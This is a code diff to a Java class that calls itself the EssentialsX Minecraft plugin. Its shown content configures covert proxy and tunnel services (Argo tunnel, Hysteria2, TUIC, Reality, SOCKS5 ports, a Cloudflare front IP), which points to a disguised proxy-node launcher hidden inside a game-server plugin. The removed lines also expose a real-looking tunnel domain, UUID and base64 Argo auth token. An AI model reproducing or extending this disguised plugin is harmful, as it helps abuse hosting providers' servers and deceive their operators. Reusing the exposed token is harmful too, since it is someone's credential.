@@ -75,10 +75,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "miget.stockhunter.qzz.io");
-        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiMGNkMmQxYjctNTU0Ni00OWYzLWE3ZWUtMzZkNWJkMDUwZTI2IiwicyI6IllUVTFaVGhoT0dJdE1UUmlaQzAwWldFeExUaG1abVF0WkRrNFltTmhPRGc1TnpsaCJ9");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "25518");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -89,7 +89,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "store.ubi.com");
         env.put("CFPORT", "443");
         env.put("NAME", "LQ");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
